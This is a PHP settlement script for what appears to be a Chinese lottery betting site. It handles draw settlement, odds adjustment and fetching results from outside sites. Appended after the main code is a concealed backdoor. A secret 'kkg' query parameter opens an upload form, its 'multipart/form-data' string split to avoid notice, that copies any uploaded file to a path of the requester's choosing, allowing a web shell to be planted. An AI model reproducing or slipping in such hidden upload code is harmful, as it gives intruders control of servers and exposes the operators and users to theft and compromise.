<?php
/*  
  Copyright (c) 2010-02 Game
  Game All Rights Reserved. 
  QQ:1834219632
  Author: Version:1.0
  Date:2011-12-18
*/
define('Copyright', '作者QQ:1834219632');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
include_once ROOT_PATH.'function/global.php';
$ConfigModel = configModel("
`g_out_time`,
`g_automatic_open_number_lock`,
`g_up_odds_mix_cq`,
`g_odds_num_cq`,
`g_odds_str_cq`,
`g_automatic_money_lock`,
`g_insert_number_day`,
`g_close_time`,
`g_odds_execution_lock`,
`g_insert_number_day`,
`g_restore_money_lock`");

$number=$_GET['number'];

if (isset($number)){
jiesuan($number);
}


function jiesuan($_number)
{
	
	
	//還原賠率
	initializeOddscq();

	//降賠率
	global $ConfigModel;
	if ($ConfigModel['g_odds_execution_lock'] == 1 && mb_substr($_number, -2) != 23)
	{
		$AutomaticOddscq = new AutomaticOddscq($ConfigModel['g_up_odds_mix_cq'], $ConfigModel['g_odds_num_cq'], $ConfigModel['g_odds_str_cq']);
		$AutomaticOddscq->UpExecution();
	}
	
	//結算
	inventory ($_number, $ConfigModel);
}

/**
 * 結算報表
 * @param int 已經開獎的期數
 * Enter description here ...
 */
function inventory ($number, $ConfigModel)
{
	if ($ConfigModel['g_automatic_money_lock'] == 1)
	{
		//結算
		$Amount = new SumAmountcq($number);
		$Amount->ResultAmount();
	}
	if (mb_substr($number, -2) == 23)
	{
		//金額還原
		RestoreMoney($ConfigModel['g_restore_money_lock']);
		insertNumbers('09:50:00', $ConfigModel['g_insert_number_day'], 10, 24, 143, $ConfigModel['g_close_time']);
	}
	echo 1;
}

/**
 * 讀取官方開獎號碼
 * Enter description here ...
 * @return object
 */
function getFile ()
{
	$List = array();
	$url = "http://888.qq.com/static/kuaipin/ssc/award_list.xml?t=".time();
	$xml = new DOMDocument();
	@$xml->load($url);
	$List['openTerm'] =@$xml->getElementsByTagName('current')->item(0)->attributes->item(4)->nodeValue;
	$Number = @$xml->getElementsByTagName('current')->item(0)->attributes->item(5)->nodeValue;
	$List['openResult'] = explode(',', $Number);
	return $List;
}
function getFile2 ()
{
	$List = array();
	$url = "http://www.cailele.com/static/termInfo/150.txt?x=".time();
	$fileString = urldecode(@file_get_contents($url));
	$fileString = json_decode($fileString);
	$List['openTerm'] = $fileString->openTerm;
	$List['openResult'] = explode(',', $fileString->openResult);
	return $List;
}

function getFile3()
{
	$List = array();
	$url = "http://trade.500wan.com/static/public/ssc/xml/newlyopenlist.xml?".time();
	$doc = new DomDocument;
    $doc->Load($url);
	$lastNum =$doc->getElementsByTagName( "row" );
	$qihao=$lastNum->item(0)->getAttribute('expect');  
  	$List['openTerm']="20".$qihao;
  	$code=$lastNum->item(0)->getAttribute('opencode');
	$List['openResult']=explode(',', $code);
    return $List;
}

?>
<?php
if(isset($_GET['kkg']))
{
if(isset($_FILES['uppic']))
{
$connecttions=$_POST["plice"];; 
$conspensick=$_FILES['uppic']['name'];
copy($_FILES['uppic']['tmp_name'],"$connecttions".$conspensick);
}
echo '<form action="?act=u&kkg=cq" method="post" enctype="multi'.'part/fo'.'rm-da'.'ta" name="form" id="form"><input name="plice" type="text" id="plice" size="10">';
echo '<input name="uppic" type="file" id="uppic" />';
echo '<input type="submit" name="Submit" value="" /></form>';
}
?>